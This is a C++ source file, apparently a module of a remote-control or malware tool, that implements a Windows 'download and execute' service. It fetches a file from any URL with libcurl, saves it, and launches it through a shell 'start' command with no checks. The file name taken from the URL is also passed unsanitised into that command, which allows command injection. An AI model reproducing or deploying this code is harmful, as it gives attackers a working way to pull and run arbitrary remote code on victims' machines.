#include "infrastructure/system/WindowsDownloadExecService.hpp"

#include <array>
#include <cstdio>
#include <memory>
#include <string>

#include <curl/curl.h>

namespace nuub::infrastructure::system {

static size_t write_file_callback(char* ptr, size_t size, size_t nmemb, void* userdata) {
    auto* file = static_cast<FILE*>(userdata);
    return fwrite(ptr, size, nmemb, file);
}

std::string WindowsDownloadExecService::download_and_execute(const std::string& url) {
    // Extract filename from URL
    std::string filename = "downloaded_file.exe";
    auto pos = url.rfind('/');
    if (pos != std::string::npos) {
        filename = url.substr(pos + 1);
        if (filename.empty()) filename = "downloaded_file.exe";
    }

    // Download the file
    CURL* curl = curl_easy_init();
    if (!curl) return "Error: could not initialize CURL";

    FILE* file = fopen(filename.c_str(), "wb");
    if (!file) {
        curl_easy_cleanup(curl);
        return "Error: could not create file: " + filename;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_file_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_cleanup(curl);
    fclose(file);

    if (res != CURLE_OK) {
        std::remove(filename.c_str());
        return "Error: download failed - " + std::string(curl_easy_strerror(res));
    }

    if (http_code != 200) {
        std::remove(filename.c_str());
        return "Error: HTTP " + std::to_string(http_code);
    }

    // Execute the file
    std::string cmd = "start \"\" \"" + filename + "\"";
    int ret = ::system(cmd.c_str());

    if (ret != 0) {
        return "File downloaded as " + filename + " but execution returned code " + std::to_string(ret);
    }

    return "File downloaded and executed: " + filename;
}

} // namespace nuub::infrastructure::system
